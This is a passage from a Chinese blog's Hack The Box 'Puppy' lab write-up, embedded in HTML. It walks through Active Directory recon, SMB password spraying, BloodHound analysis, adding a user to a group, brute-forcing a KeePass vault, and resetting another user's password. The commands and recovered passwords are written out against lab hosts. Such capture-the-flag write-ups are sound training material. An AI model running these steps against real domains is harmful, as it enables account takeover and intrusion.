<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">HackTheBox - Season8 - Puppy</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c16f7e2b105eef61.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c16f7e2b105eef61.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-87d35e113019ad3d.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_buildManifest.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3xl px-3 mt-5 md:mt-15"><h1 class="text-xl md:text-2xl font-bold text-red-700">HackTheBox - Season8 - Puppy</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-05-19</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-05-19<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Windows靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">域渗透</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">DPAPI</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Keepass</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">encrypt</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Puppy","contentHtml":"\u003ch1\u003eSeason8 - Puppy\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/661\"\u003ehttps://app.hackthebox.com/machines/661\u003c/a\u003e | \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eMachine Information：As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e账户：\u003cstrong\u003elevi.james:KingofAkron2025!\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy nmap -sT -min-rate 10000 -p- 10.10.11.70         \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-18 08:09 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e puppy.htb (10.10.11.70)\nHost is up (0.18s latency).\nNot shown: 65518 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n111/tcp   open  rpcbind\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n636/tcp   open  ldapssl\n2049/tcp  open  nfs\n3260/tcp  open  iscsi\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49670/tcp open  unknown\n49685/tcp open  unknown\n61851/tcp open  unknown\n61886/tcp open  unknown\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 95.27 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没有 \u003ccode\u003eWeb\u003c/code\u003e 端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy nmap -sT -A -T4 -O -p 53,88,111,445,2049,3260 10.10.11.70\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-18 08:15 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e puppy.htb (10.10.11.70)\nHost is up (0.22s latency).\n\nBug \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e iscsi-info: no string output.\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain?\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-05-18 18:54:52Z)\n111/tcp  open  rpcbind       2-4 (RPC \u003cspan class=\"hljs-comment\"\u003e#100000)\u003c/span\u003e\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n445/tcp  open  microsoft-ds?\n2049/tcp open  nlockmgr      1-4 (RPC \u003cspan class=\"hljs-comment\"\u003e#100021)\u003c/span\u003e\n3260/tcp open  iscsi?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-05-18T18:57:23\n|_  start_date: N/A\n|_clock-skew: 6h39m12s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   254.01 ms 10.10.16.1\n2   254.12 ms puppy.htb (10.10.11.70)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cp\u003e因为我们有凭据所以直接去进行信息收集\u003c/p\u003e\n\u003ch3\u003eSMB\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy  crackmapexec smb 10.10.11.70 -u levi.james -p \u003cspan class=\"hljs-string\"\u003e'KingofAkron2025!'\u003c/span\u003e\nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eDump\u003c/code\u003e 用户信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy crackmapexec smb 10.10.11.70 -u levi.james -p \u003cspan class=\"hljs-string\"\u003e'KingofAkron2025!'\u003c/span\u003e -d PUPPY.HTB --\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \nSMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper_adm               badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\steph.cooper                   badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\jamie.williams                 badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\adam.silver                    badpwdcount: 0 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\ant.edwards                    badpwdcount: 0 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\levi.james                     badpwdcount: 5 desc: \nSMB         10.10.11.70     445    DC               PUPPY.HTB\\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\Guest                          badpwdcount: 0 desc: Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e guest access to the computer/domain\nSMB         10.10.11.70     445    DC               PUPPY.HTB\\Administrator                  badpwdcount: 0 desc: Built-\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e account \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e administering the computer/domain\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSMBclient 查看共享文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy smbclient -L 10.10.11.70 -U puppy.htb/levi.james%KingofAkron2025!\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        DEV             Disk      DEV-SHARE \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e PUPPY-DEVS\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy smbclient //10.10.11.70/SYSVOL -U puppy.htb/levi.james%KingofAkron2025!\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                   D        0  Fri Mar 21 01:33:44 2025\n  ..                                  D        0  Wed Feb 19 06:44:57 2025\n  lvRxjnmZBA                          D        0  Fri Mar 21 01:33:44 2025\n  PUPPY.HTB                          Dr        0  Wed Feb 19 06:44:57 2025\n  UltFsQYRGg.txt                      A        0  Fri Mar 21 01:33:44 2025\n\n                5080575 blocks of size 4096. 1544518 blocks available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将上面获取到的用户信息将用户名截取下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e data.txt | awk \u003cspan class=\"hljs-string\"\u003e'{print $5}'\u003c/span\u003e | awk -F\u003cspan class=\"hljs-string\"\u003e'\\'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e\nsteph.cooper_adm\nsteph.cooper\njamie.williams\nadam.silver\nant.edwards\nlevi.james\nkrbtgt\nGuest\nAdministrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 \u003ccode\u003ecrackmapexec\u003c/code\u003e 进行密码喷洒，结果依旧是只有 \u003ccode\u003elevi.james\u003c/code\u003e 用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy crackmapexec smb 10.10.11.70 -u user.txt -p \u003cspan class=\"hljs-string\"\u003e'KingofAkron2025!'\u003c/span\u003e -d PUPPY.HTB             \nSMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)\nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper_adm:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\steph.cooper:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\jamie.williams:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\adam.silver:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [-] PUPPY.HTB\\ant.edwards:KingofAkron2025! STATUS_LOGON_FAILURE \nSMB         10.10.11.70     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eHoundBlood\u003c/h3\u003e\n\u003cp\u003e使用 \u003ccode\u003ebloodhound-python\u003c/code\u003e 来获取数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'levi.james'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'KingofAkron2025!'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'puppy.htb'\u003c/span\u003e -ns 10.10.11.70 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC.PUPPY.HTB'\u003c/span\u003e\nINFO: Found AD domain: puppy.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: DC.PUPPY.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.PUPPY.HTB\nINFO: Found 10 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 56 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 3 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.PUPPY.HTB\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 31S\nINFO: Compressing output into 20250518084406_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户 \u003ccode\u003elevi.james\u003c/code\u003e 的信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e所属组以及拥有的修改权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用户 \u003ccode\u003elevi.james\u003c/code\u003e 对 \u003ccode\u003eDEVELOPERS\u003c/code\u003e 组拥有 \u003ccode\u003eGenericAll\u003c/code\u003e 权限，并且有三个用户属于\u003ccode\u003eDEVELOPERS\u003c/code\u003e 组\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其中下一个目标用户可能就是 \u003ccode\u003eANT.EDWARDS\u003c/code\u003e  或者 \u003ccode\u003eADAM.SILVER\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eANT.EDWARDS\u003c/code\u003e 可以控制 \u003ccode\u003eADAM.SILVER\u003c/code\u003e，\u003ccode\u003eADAM.SILVER\u003c/code\u003e 是远程组成员\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们给 \u003ccode\u003elevi.james\u003c/code\u003e 添加到 \u003ccode\u003eDEVELPOERS\u003c/code\u003e 组内\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy bloodyAD -d puppy.htb -u levi.james -p KingofAkron2025! --dc-ip 10.10.11.70 add groupMember DEVELOPERS levi.james\n[+] levi.james added to DEVELOPERS\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后上面\u003ccode\u003eSMB\u003c/code\u003e共享文件夹中的\u003ccode\u003eDEV\u003c/code\u003e加入组后再查看一次，可以访问了（未加入组之前是空的），将所有文件都拉取下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy smbclient //10.10.11.70/DEV -U puppy.htb/levi.james%KingofAkron2025!\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n  .                                  DR        0  Sun Mar 23 03:07:57 2025\n  ..                                  D        0  Sat Mar  8 11:52:57 2025\n  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025\n  Projects                            D        0  Sat Mar  8 11:53:36 2025\n  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025\n\n                5080575 blocks of size 4096. 1543255 blocks available\nsmb: \\\u003e mget *\nGet file KeePassXC-2.7.9-Win64.msi? \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e\ngetting file \\KeePassXC-2.7.9-Win64.msi of size 34394112 as KeePassXC-2.7.9-Win64.msi (1339.5 KiloBytes/sec) (average 1339.5 KiloBytes/sec)\nGet file recovery.kdbx? \u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003ekdbx 破解\u003c/h3\u003e\n\u003cp\u003e其中 \u003ccode\u003ekdbx\u003c/code\u003e 是 \u003ccode\u003eKeePass\u003c/code\u003e 的文件，需要密码才能解开\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里使用项目：\u003ca href=\"https://github.com/r3nt0n/keepass4brute\"\u003ehttps://github.com/r3nt0n/keepass4brute\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e使用之前需要安装依赖：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e apt install keepassxc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到密码 \u003ccode\u003elivepool\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解密后得到五个用户的账号密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eADAM.SILVER:ADAM.SILVER:HJKL2025!\nANTONY C.EDWARDS:ANT.EDWARDS:Antman2025!\nJAMIE WILLIAMSON:JAMIE.WILLIAMSON:JamieLove2025!\nSAMUEL BLAKE:ILY2025!\nSTEVE TUCKER:Steve2025!\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo Adam.Silver\u003c/h2\u003e\n\u003cp\u003e这里使用 \u003ccode\u003eADAM.SILVER\u003c/code\u003e 的用户凭据却无法进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Puppy/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为 \u003ccode\u003eANT.EDWARDS\u003c/code\u003e 对其拥有 \u003ccode\u003eGenericALL\u003c/code\u003e 权限，尝试修改其密码再进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Puppy ntpdate -s 10.10.11.70 | bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --dc-ip 10.10.11.70 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password adam.silver Passwords123!\n[+] Password changed 